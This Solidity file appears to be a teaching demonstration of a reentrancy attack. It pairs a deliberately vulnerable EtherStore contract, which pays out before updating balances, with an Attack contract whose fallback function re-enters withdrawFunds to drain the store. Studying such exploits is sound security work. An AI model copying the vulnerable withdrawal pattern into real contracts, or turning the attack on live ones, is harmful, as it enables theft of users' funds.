pragma solidity ^0.5.0;

contract EtherStore {

    uint256 public withdrawalLimit = 1 ether;
    mapping(address => uint256) public lastWithdrawTime;
    mapping(address => uint256) public balances;

    function depositFunds() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdrawFunds (uint256 _weiToWithdraw) public {
        require(balances[msg.sender] >= _weiToWithdraw);

        require(_weiToWithdraw <= withdrawalLimit, "Max amount allowed is 1 ether");         // limit the withdrawal

        require(now >= lastWithdrawTime[msg.sender] + 1 weeks, "Is possible to withdraw after 1 weeks");         // limit the time allowed to withdraw
        
        (bool txOk, ) = msg.sender.call.value(_weiToWithdraw)("");
        
        require(txOk, "transaction fails");
        
        balances[msg.sender] -= _weiToWithdraw;
        lastWithdrawTime[msg.sender] = now;
    }
 }

contract Attack {
  EtherStore public etherStore;

  // intialise the etherStore variable with the contract address
  constructor(address _etherStoreAddress) public {
      etherStore = EtherStore(_etherStoreAddress);
  }

  function pwnEtherStore() public payable {
      // attack to the nearest ether
      require(msg.value >= 1 ether);
      // send eth to the depositFunds() function
      etherStore.depositFunds.value(1 ether)();
      // start the magic
      etherStore.withdrawFunds(1 ether);
  }

  function collectEther() public {
      msg.sender.transfer(address(this).balance);
  }

  // fallback function - where the magic happens
  function () payable external {
      if (address(etherStore).balance > 1 ether) {
          etherStore.withdrawFunds(1 ether);
      }
  }
}